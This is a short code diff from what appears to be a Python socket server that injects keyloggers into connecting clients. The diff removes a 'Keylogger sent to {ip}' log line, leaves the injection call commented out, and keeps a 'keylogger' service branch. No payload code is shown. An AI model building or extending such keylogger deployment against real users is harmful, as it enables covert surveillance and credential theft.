@@ -77,7 +77,6 @@ class SocketServer:
             user.first_name, user.last_name = (await self.recognizer.get_username(reader, writer)).values()
             self.user_repository.add_user(user)
             #await self.keylogger.inject(reader, writer, uuid)
-            logging.info(f"Keylogger sent to {ip}")
         elif service == "keylogger":
             await self.keylogger.action(params, uuid)
             return "[close]"
